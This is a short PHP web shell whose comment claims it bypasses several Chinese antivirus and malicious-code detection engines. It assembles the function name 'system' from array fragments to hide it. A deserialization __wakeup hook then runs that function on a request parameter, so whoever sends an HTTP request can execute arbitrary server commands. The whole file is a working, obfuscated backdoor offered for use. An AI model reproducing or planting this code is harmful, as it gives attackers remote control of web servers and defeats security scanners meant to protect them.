<?php
//bypass 牧云 and TAV反病毒引擎+洋葱恶意代码检测引擎
class A{
    public function __construct(){}

    public function __wakeup(){
        $b = $_GET[1];
        $result = array_diff(["s","a","b","ys","te","m"],["a","b"]);
        $a = join($result);
        Closure::fromCallable($a)->__invoke($_REQUEST[2]);
    }
}

@unserialize('O:1:"A":1:{s:10:" A comment";N;}');
